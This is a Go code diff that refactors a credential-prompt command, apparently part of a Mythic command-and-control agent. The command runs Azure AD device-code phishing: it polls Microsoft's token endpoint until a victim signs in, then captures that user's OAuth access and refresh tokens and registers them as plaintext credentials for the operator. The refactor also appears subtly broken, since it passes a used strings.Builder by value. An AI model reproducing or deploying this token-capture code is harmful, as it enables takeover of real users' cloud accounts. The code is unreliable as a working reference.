@@ -153,7 +153,10 @@ func credPromptDeviceCodeFlow(task structs.Task) structs.CommandResult {
 	sb.WriteString(fmt.Sprintf("Tenant:      %s\n\n", tenantID))
 	sb.WriteString("Polling for authentication...\n\n")
 
-	// Step 2: Poll for token
+	return credPromptPollForToken(sb, client, tenantID, clientID, dcResp)
+}
+
+func credPromptPollForToken(sb strings.Builder, client *http.Client, tenantID, clientID string, dcResp deviceCodeResponse) structs.CommandResult {
 	tokenURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", tenantID)
 	interval := dcResp.Interval
 	if interval < 5 {
@@ -194,10 +197,10 @@ func credPromptDeviceCodeFlow(task structs.Task) structs.CommandResult {
 		}
 
 		if token.Error == "authorization_pending" {
-			continue // User hasn't authenticated yet
+			continue
 		}
 		if token.Error == "slow_down" {
-			interval += 5 // Back off
+			interval += 5
 			continue
 		}
 		if token.Error != "" {
@@ -205,62 +208,60 @@ func credPromptDeviceCodeFlow(task structs.Task) structs.CommandResult {
 			return successResult(sb.String())
 		}
 
-		// Success — we got tokens
-		sb.WriteString("[+] USER AUTHENTICATED — Tokens captured!\n\n")
-		sb.WriteString(fmt.Sprintf("Token Type:    %s\n", token.TokenType))
-		sb.WriteString(fmt.Sprintf("Scope:         %s\n", token.Scope))
-		sb.WriteString(fmt.Sprintf("Expires In:    %d seconds\n\n", token.ExpiresIn))
-
-		if token.AccessToken != "" {
-			// Truncate access token for display (full token in credentials)
-			display := token.AccessToken
-			if len(display) > 80 {
-				display = display[:80] + "..."
-			}
-			sb.WriteString(fmt.Sprintf("Access Token:  %s\n", display))
-		}
-		if token.RefreshToken != "" {
-			display := token.RefreshToken
-			if len(display) > 80 {
-				display = display[:80] + "..."
-			}
-			sb.WriteString(fmt.Sprintf("Refresh Token: %s\n", display))
-		}
-
-		// Register tokens as credentials
-		var creds []structs.MythicCredential
-		if token.AccessToken != "" {
-			creds = append(creds, structs.MythicCredential{
-				CredentialType: "plaintext",
-				Realm:          "azure-ad",
-				Account:        "oauth-access-token",
-				Credential:     token.AccessToken,
-				Comment:        fmt.Sprintf("credential-prompt device-code (client: %s, tenant: %s)", clientID, tenantID),
-			})
-		}
-		if token.RefreshToken != "" {
-			creds = append(creds, structs.MythicCredential{
-				CredentialType: "plaintext",
-				Realm:          "azure-ad",
-				Account:        "oauth-refresh-token",
-				Credential:     token.RefreshToken,
-				Comment:        fmt.Sprintf("credential-prompt device-code (client: %s, tenant: %s) — PERSISTENT", clientID, tenantID),
-			})
-		}
-
-		result := structs.CommandResult{
-			Output:    sb.String(),
-			Status:    "success",
-			Completed: true,
-		}
-		if len(creds) > 0 {
-			result.Credentials = &creds
-		}
-
-		// Zero sensitive data
-		structs.ZeroString(&token.AccessToken)
-		structs.ZeroString(&token.RefreshToken)
-
-		return result
+		return credPromptBuildTokenResult(&sb, token, clientID, tenantID)
 	}
+}
+
+func credPromptBuildTokenResult(sb *strings.Builder, token oauthTokenResponse, clientID, tenantID string) structs.CommandResult {
+	sb.WriteString("[+] USER AUTHENTICATED — Tokens captured!\n\n")
+	sb.WriteString(fmt.Sprintf("Token Type:    %s\n", token.TokenType))
+	sb.WriteString(fmt.Sprintf("Scope:         %s\n", token.Scope))
+	sb.WriteString(fmt.Sprintf("Expires In:    %d seconds\n\n", token.ExpiresIn))
+
+	for _, t := range []struct{ label, val string }{
+		{"Access Token", token.AccessToken},
+		{"Refresh Token", token.RefreshToken},
+	} {
+		if t.val != "" {
+			display := t.val
+			if len(display) > 80 {
+				display = display[:80] + "..."
+			}
+			sb.WriteString(fmt.Sprintf("%-14s %s\n", t.label+":", display))
+		}
+	}
+
+	var creds []structs.MythicCredential
+	if token.AccessToken != "" {
+		creds = append(creds, structs.MythicCredential{
+			CredentialType: "plaintext",
+			Realm:          "azure-ad",
+			Account:        "oauth-access-token",
+			Credential:     token.AccessToken,
+			Comment:        fmt.Sprintf("credential-prompt device-code (client: %s, tenant: %s)", clientID, tenantID),
+		})
+	}
+	if token.RefreshToken != "" {
+		creds = append(creds, structs.MythicCredential{
+			CredentialType: "plaintext",
+			Realm:          "azure-ad",
+			Account:        "oauth-refresh-token",
+			Credential:     token.RefreshToken,
+			Comment:        fmt.Sprintf("credential-prompt device-code (client: %s, tenant: %s) — PERSISTENT", clientID, tenantID),
+		})
+	}
+
+	result := structs.CommandResult{
+		Output:    sb.String(),
+		Status:    "success",
+		Completed: true,
+	}
+	if len(creds) > 0 {
+		result.Credentials = &creds
+	}
+
+	structs.ZeroString(&token.AccessToken)
+	structs.ZeroString(&token.RefreshToken)
+
+	return result
 }
